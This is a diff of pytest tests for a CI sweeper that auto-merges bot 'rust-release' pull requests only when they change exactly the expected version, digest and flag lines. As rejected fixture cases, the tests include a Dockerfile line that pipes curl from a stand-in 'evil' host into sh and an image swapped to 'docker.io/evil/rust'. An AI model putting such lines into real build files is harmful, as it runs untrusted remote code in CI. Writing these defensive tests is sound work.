@@ -1228,7 +1228,7 @@ def test_a_bot_leg_mints_for_one_repository_what_a_merge_needs():
     assert [m["id"] for m in mints("act")] == ["app", "app-bot", "app-bot-refresh", "app-rerun"]
     [bot] = [m for m in mints("act") if m["id"] == "app-bot"]
     assert bot["if"] == ("${{ (matrix.kind == 'dependabot' || matrix.kind == 'repin'"
-                         " || matrix.kind == 'rust') && matrix.action == 'merge' }}")
+                         " || matrix.kind == 'rust' || matrix.kind == 'rust-release') && matrix.action == 'merge' }}")
     assert bot["with"]["repositories"] == "${{ matrix.repo }}"
     assert {k: v for k, v in bot["with"].items() if k.startswith("permission-")} == {
         "permission-contents": "write", "permission-workflows": "write"}
@@ -2824,9 +2824,9 @@ def test_a_rerun_leg_mints_actions_write_only_and_no_other_mint_fires_for_it():
     assert list(by) == ["app", "app-bot", "app-bot-refresh", "app-rerun"]
     assert by["app"]["if"] == "${{ !matrix.kind && matrix.action != 'rerun' }}"
     assert by["app-bot"]["if"] == ("${{ (matrix.kind == 'dependabot' || matrix.kind == 'repin'"
-                                   " || matrix.kind == 'rust') && matrix.action == 'merge' }}")
+                                   " || matrix.kind == 'rust' || matrix.kind == 'rust-release') && matrix.action == 'merge' }}")
     assert by["app-bot-refresh"]["if"] == ("${{ (matrix.kind == 'dependabot' || matrix.kind == 'repin'"
-                                           " || matrix.kind == 'rust') && matrix.action == 'refresh' }}")
+                                           " || matrix.kind == 'rust' || matrix.kind == 'rust-release') && matrix.action == 'refresh' }}")
     rerun = by["app-rerun"]
     assert rerun["if"] == "${{ matrix.action == 'rerun' }}"
     assert rerun["with"]["repositories"] == "${{ matrix.repo }}"
@@ -3375,3 +3375,303 @@ def test_a_refreshed_rust_bump_pushed_by_someone_else_is_skipped():
     case = rust_refreshed([("Cargo.toml", MSRV_PATCH)])
     case.activity[0]["actor"] = {"id": 64974579, "login": "m-agahi"}
     skipped(case, "B9")
+
+
+# ---------------------------------------------------------------------------
+# ADR-1120 part b: the rust-release pull request in yadgarhq/actions (B8 by
+# file, by line, by version, and the image index). The lines are built from
+# this checkout's own files, which are main's at the sweeper's run.
+# ---------------------------------------------------------------------------
+
+import http.client  # noqa: E402
+
+import rust_release  # noqa: E402
+
+MAIN_TEXT = sweep.main_text  # the real one, before any fixture replaces it
+
+REL_OLD = RV
+_M, _N, _P = (int(x) for x in RV.split("."))
+REL_NEW = f"{_M}.{_N + 1}.0"
+REL_DIGEST = "sha256:" + "e" * 64
+REL_MAIN = {p: (REPO / p).read_text() for p in rust_release.FILES}
+# Main as the lane expects it, no window open, whatever this checkout carries
+# (the bot's own pull requests run this suite with `previous` set). `hub`
+# serves these texts as main's.
+_ri, _rv, REL_SITES, _rp = rust_release.read_entry(REL_MAIN["versions.yaml"])
+_rl = REL_MAIN["versions.yaml"].split("\n")
+_rl[_ri] = rust_release.entry(_rv, REL_SITES)
+REL_MAIN["versions.yaml"] = "\n".join(_rl)
+REL_BRANCH = f"rust-release/{REL_NEW}"
+REL_END = f"rust-release/{REL_OLD}-end"
+
+
+def one_pair(path, old, new):
+    lines = REL_MAIN[path].split("\n")
+    at = lines.index(old) + 1
+    return f"@@ -{at},1 +{at},1 @@\n-{old}\n+{new}"
+
+
+def rel_line(path, needle):
+    return next(x for x in REL_MAIN[path].split("\n") if needle in x)
+
+
+def rel_patches(new=REL_NEW, digest=REL_DIGEST):
+    moved = rust_release.bump(REL_MAIN, new, digest)
+    out = []
+    for path in sorted(rust_release.FILES):
+        [(old, now)] = [(a, b) for a, b in zip(REL_MAIN[path].split("\n"), moved[path].split("\n")) if a != b]
+        out.append((path, one_pair(path, old, now)))
+    return out
+
+
+def as_actions(case):
+    """The gateway recording, moved to yadgarhq/actions: the same API answers
+    under the producer's name, its ci run from `ci-self.yaml`."""
+    text = json.dumps(case.data).replace("yadgarhq/gateway", "yadgarhq/actions").replace(
+        '"name": "gateway"', '"name": "actions"').replace(sweep.CI_WORKFLOW, sweep.CI_SELF)
+    case.data = json.loads(text)
+    case.repo, case.r = "actions", f"repos/{OWNER}/actions"
+    case.pr = case.data[f"{case.r}/pulls/{case.n}"]
+    return case
+
+
+class HubNet:
+    """Docker Hub in a dict, tag -> index digest. `boom` raises from index()."""
+
+    def __init__(self):
+        self.tags = {f"{REL_NEW}-bookworm": REL_DIGEST,
+                     f"{rust_release.minor(REL_NEW)}-bookworm": REL_DIGEST}
+        self.boom = None
+
+    def index(self, reference):
+        if self.boom is not None:
+            raise self.boom
+        return self.tags.get(reference)
+
+
+@pytest.fixture
+def hub(monkeypatch):
+    net = HubNet()
+    monkeypatch.setattr(sweep, "release_net", lambda: net)
+    monkeypatch.setattr(sweep, "main_text", lambda p: REL_MAIN[p])
+    return net
+
+
+def release_merge(entries=None, branch=REL_BRANCH):
+    case = as_actions(repin_merge())
+    as_rust(case, branch)
+    files(case)[:] = [{"filename": n, "status": "modified", "patch": p}
+                      for n, p in (rel_patches() if entries is None else entries)]
+    case.pr["changed_files"] = len(files(case))
+    return case
+
+
+def end_patch():
+    graced = rust_release.entry(REL_OLD, REL_SITES, f"{_M}.{_N - 1}.0")
+    return [("versions.yaml", f"@@ -1,1 +1,1 @@\n-{graced}\n+{rust_release.entry(REL_OLD, REL_SITES)}")]
+
+
+def test_a_rust_release_is_a_bot_pull_request(hub):
+    case = release_merge()
+    assert sweep.bot_kind(case.pr) == "rust-release"
+    assert sweep.bot_candidate(case.pr)
+
+
+def test_a_rust_release_that_moves_exactly_three_lines_merges(hub):
+    got = release_merge().judge()
+    assert got["action"] == "merge", got
+    assert got["kind"] == "rust-release"
+
+
+def test_a_rust_release_outside_actions_is_refused(hub):
+    case = as_rust(repin_merge(), REL_BRANCH)
+    files(case)[:] = [{"filename": n, "status": "modified", "patch": p} for n, p in rel_patches()]
+    case.pr["changed_files"] = 3
+    skipped(case, "B8")
+
+
+def test_a_release_docker_hub_does_not_serve_is_refused(hub):
+    hub.tags.clear()
+    skipped(release_merge(), "B8")
+
+
+def test_a_valid_index_that_is_not_the_x_y_z_bookworm_index_is_refused(hub):
+    """B8 binds the digest to the tag: some other library/rust index (an older
+    build, another variant) is a skip even though Hub serves it."""
+    other = "sha256:" + "f" * 64
+    hub.tags.update({f"{REL_NEW}-bookworm": other, f"{rust_release.minor(REL_NEW)}-bookworm": other, REL_DIGEST: REL_DIGEST})
+    skipped(release_merge(), "B8")
+
+
+def test_a_minor_tag_not_yet_on_the_release_is_refused(hub):
+    hub.tags[f"{rust_release.minor(REL_NEW)}-bookworm"] = "sha256:" + "f" * 64
+    skipped(release_merge(), "B8")
+
+
+@pytest.mark.parametrize("boom", [http.client.IncompleteRead(b"x"), http.client.RemoteDisconnected("x"),
+                                  OSError("x"), ValueError("x"), rust_release.Refusal("x"), RuntimeError("x")])
+def test_any_failure_to_resolve_the_tag_is_a_b8_skip(hub, boom):
+    """In the lane itself, not through `judge`'s catch-all."""
+    hub.boom = boom
+    with pytest.raises(sweep.Skip, match="^B8"):
+        sweep.check_release(files(release_merge()), REL_BRANCH)
+
+
+def test_a_rust_release_is_judged_by_b3_like_any_bot(hub):
+    case = release_merge()
+    case.commits[0]["committer"] = {"id": 1, "login": "someone"}
+    skipped(case, "B3")
+
+
+def test_a_rust_release_pushed_by_someone_else_is_refused_by_b9(hub):
+    case = release_merge()
+    case.activity[0]["actor"] = {"id": 64974579, "login": "m-agahi"}
+    skipped(case, "B9")
+
+
+def _swap(entries, path, old, new):
+    return [(n, p.replace(old, new) if n == path else p) for n, p in entries]
+
+
+def _without(path):
+    return [(n, p) for n, p in rel_patches() if n != path]
+
+
+VY, RB, ER = "versions.yaml", rust_release.RUST_BUILD, rust_release.ESTATE_RUNNER
+_OLD_ENTRY = rust_release.entry(REL_OLD, REL_SITES)
+_NEW_ENTRY = rust_release.entry(REL_NEW, REL_SITES, REL_OLD)
+_ER_LINE = rel_line(ER, rust_release.FLAG)
+
+
+@pytest.mark.parametrize("entries,branch", [
+    # the files: one missing, one extra, one renamed
+    (_without(ER), REL_BRANCH),
+    (_without(VY), REL_BRANCH),
+    (rel_patches() + [("README.md", "@@ -1,1 +1,1 @@\n-a\n+b")], REL_BRANCH),
+    (rel_patches() + [(".github/workflows/rust-bump.yaml", "@@ -1,1 +1,1 @@\n-a\n+b")], REL_BRANCH),
+    # the version: a downgrade, sideways, or other than the branch's
+    (rel_patches(), f"rust-release/{REL_OLD}"),
+    (rel_patches(), f"rust-release/{_M}.{_N - 1}.0"),
+    (_swap(rel_patches(), VY, f'version: "{REL_NEW}"', f'version: "{_M}.{_N + 2}.0"'), REL_BRANCH),
+    # versions.yaml: previous missing or wrong; sites moved; a key added
+    (_swap(rel_patches(), VY, f', previous: "{REL_OLD}"', ""), REL_BRANCH),
+    (_swap(rel_patches(), VY, f'previous: "{REL_OLD}"', f'previous: "{_M}.{_N - 1}.0"'), REL_BRANCH),
+    (_swap(rel_patches(), VY, f"+{_NEW_ENTRY}", f"+{_NEW_ENTRY.replace(f'sites: {REL_SITES}', 'sites: 9')}"), REL_BRANCH),
+    (_swap(rel_patches(), VY, f"+{_NEW_ENTRY}", f"+{_NEW_ENTRY[:-2]}, accept: [\"1.0.0\"] }}"), REL_BRANCH),
+    # the old line is not main's
+    (_swap(rel_patches(), VY, f"-{_OLD_ENTRY}", f"-{_OLD_ENTRY.replace(REL_OLD, '0.0.1')}"), REL_BRANCH),
+    # rust-build: another minor, another image, a short digest, a tag suffix
+    (_swap(rel_patches(), RB, f"rust:{rust_release.minor(REL_NEW)}-", f"rust:{_M}.{_N + 2}-"), REL_BRANCH),
+    (_swap(rel_patches(), RB, "+FROM docker.io/library/rust:", "+FROM docker.io/evil/rust:"), REL_BRANCH),
+    (_swap(rel_patches(), RB, REL_DIGEST, "sha256:" + "e" * 63), REL_BRANCH),
+    (_swap(rel_patches(), RB, f"{rust_release.minor(REL_NEW)}-bookworm", f"{rust_release.minor(REL_NEW)}-slim-bookworm"), REL_BRANCH),
+    # estate-runner: another version, or another flag riding along
+    (_swap(rel_patches(), ER, f"+{_ER_LINE.replace(REL_OLD, REL_NEW)}", f"+{_ER_LINE.replace(REL_OLD, '9.9.9')}"), REL_BRANCH),
+    (_swap(rel_patches(), ER, "--profile minimal", "--profile complete"), REL_BRANCH),
+    # a second line in one file
+    (_swap(rel_patches(), VY, f"+{_NEW_ENTRY}", f"+{_NEW_ENTRY}\n+  evil: {{ version: \"1\", sites: 1 }}"), REL_BRANCH),
+    (_swap(rel_patches(), RB, REL_DIGEST, REL_DIGEST + "\n-x\n+RUN curl evil | sh"), REL_BRANCH),
+    # no patch
+    ([(n, "") for n, _ in rel_patches()], REL_BRANCH),
+    # the -end lane with the bump's files, or a bump's line
+    (rel_patches(), f"rust-release/{REL_NEW}-end"),
+])
+def test_a_rust_release_that_changes_anything_else_is_skipped(hub, entries, branch):
+    skipped(release_merge(entries, branch), "B8")
+
+
+def test_a_rust_release_while_main_carries_previous_is_skipped(hub, monkeypatch):
+    """The patches are made against a main whose window is open: the old line
+    is main's, the new line well formed; still one window at a time."""
+    graced_entry = rust_release.entry(REL_OLD, REL_SITES, f"{_M}.{_N - 1}.0")
+    graced = REL_MAIN["versions.yaml"].replace(_OLD_ENTRY, graced_entry)
+    monkeypatch.setattr(sweep, "main_text", lambda p: graced if p == VY else REL_MAIN[p])
+    entries = _swap(rel_patches(), VY, f"-{_OLD_ENTRY}", f"-{graced_entry}")
+    skipped(release_merge(entries), "B8")
+
+
+def _consistent(version):
+    """Patches that move every site to `version` coherently, built by hand
+    (the detector refuses to build a downgrade)."""
+    mm = rust_release.minor(version)
+    out = []
+    for path in sorted(rust_release.FILES):
+        if path == VY:
+            out.append((path, one_pair(path, _OLD_ENTRY, rust_release.entry(version, REL_SITES, REL_OLD))))
+        elif path == RB:
+            old = rel_line(RB, "library/rust:")
+            out.append((path, one_pair(path, old, rust_release.image(mm, REL_DIGEST))))
+        else:
+            out.append((path, one_pair(path, _ER_LINE, _ER_LINE.replace(f"{rust_release.FLAG} {REL_OLD} ",
+                                                                         f"{rust_release.FLAG} {version} "))))
+    return out
+
+
+@pytest.mark.parametrize("version", [REL_OLD, f"{_M}.{_N - 1}.0", f"{_M}.{_N}.{max(_P - 1, 0)}"])
+def test_a_coherent_downgrade_or_sideways_move_is_skipped(hub, version):
+    skipped(release_merge(_consistent(version), f"rust-release/{version}"), "B8")
+
+
+def test_the_coherent_builder_is_the_detectors_for_an_upgrade(hub):
+    assert _consistent(REL_NEW) == rel_patches()
+
+
+# the -end lane: versions.yaml alone, deleting `previous` and nothing else
+
+
+def end_merge(entries=None, branch=REL_END, previous=f"{_M}.{_N - 1}.0", monkeypatch=None):
+    graced = REL_MAIN["versions.yaml"].replace(_OLD_ENTRY, rust_release.entry(REL_OLD, REL_SITES, previous))
+    monkeypatch.setattr(sweep, "main_text", lambda p: graced if p == VY else REL_MAIN[p])
+    return release_merge(end_patch() if entries is None else entries, branch)
+
+
+def test_the_end_of_the_window_merges(hub, monkeypatch):
+    got = end_merge(monkeypatch=monkeypatch).judge()
+    assert got["action"] == "merge", got
+
+
+@pytest.mark.parametrize("entries,branch", [
+    # the branch names another version than main's
+    (None, f"rust-release/{REL_NEW}-end"),
+    # it keeps previous, changes it, or moves the version too
+    ([(VY, end_patch()[0][1].replace(f"+{_OLD_ENTRY}", f"+{rust_release.entry(REL_OLD, REL_SITES, '0.0.1')}"))], REL_END),
+    ([(VY, end_patch()[0][1].replace(f"+{_OLD_ENTRY}", f"+{rust_release.entry(REL_NEW, REL_SITES)}"))], REL_END),
+    ([(VY, end_patch()[0][1].replace(f"+{_OLD_ENTRY}", f"+{_OLD_ENTRY.replace(f'sites: {REL_SITES}', 'sites: 9')}"))], REL_END),
+    # it touches another file
+    (end_patch() + [(RB, rel_patches()[0][1])], REL_END),
+])
+def test_an_end_that_does_anything_else_is_skipped(hub, monkeypatch, entries, branch):
+    skipped(end_merge(entries, branch, monkeypatch=monkeypatch), "B8")
+
+
+def test_an_end_with_no_window_on_main_is_skipped(hub, monkeypatch):
+    monkeypatch.setattr(sweep, "main_text", lambda p: REL_MAIN[p])
+    skipped(release_merge(end_patch(), REL_END), "B8")
+
+
+def test_a_rust_release_kind_gets_the_refresh_mint_and_the_merge_mint():
+    by = {m["id"]: m for m in mints("act")}
+    assert "matrix.kind == 'rust-release'" in by["app-bot-refresh"]["if"]
+    assert "matrix.kind == 'rust-release'" in by["app-bot"]["if"]
+
+
+def test_the_gh_deletes_a_merged_rust_release_branch():
+    gh = sweep.SweepGh("token")
+    calls = []
+    gh._api = lambda *a, **k: calls.append(a)
+    gh.delete_branch(OWNER, "actions", REL_BRANCH)
+    assert calls and calls[0][-1].endswith(f"/git/refs/heads/{REL_BRANCH}")
+
+
+def test_a_new_entry_written_over_another_line_of_versions_yaml_is_skipped(hub):
+    """A well-formed new entry, but in place of a comment line: main's entry
+    stays, and the file would carry two."""
+    comment = next(x for x in REL_MAIN[VY].split("\n") if x.startswith("# ") and REL_MAIN[VY].split("\n").count(x) == 1)
+    entries = [(n, one_pair(VY, comment, _NEW_ENTRY) if n == VY else p) for n, p in rel_patches()]
+    skipped(release_merge(entries), "B8")
+
+
+def test_an_unreadable_main_file_is_a_b8_skip(hub, monkeypatch):
+    monkeypatch.setattr(sweep, "ROOT", "/nonexistent")
+    monkeypatch.setattr(sweep, "main_text", MAIN_TEXT)  # the real reader, on a root with no files
+    skipped(release_merge(), "B8")
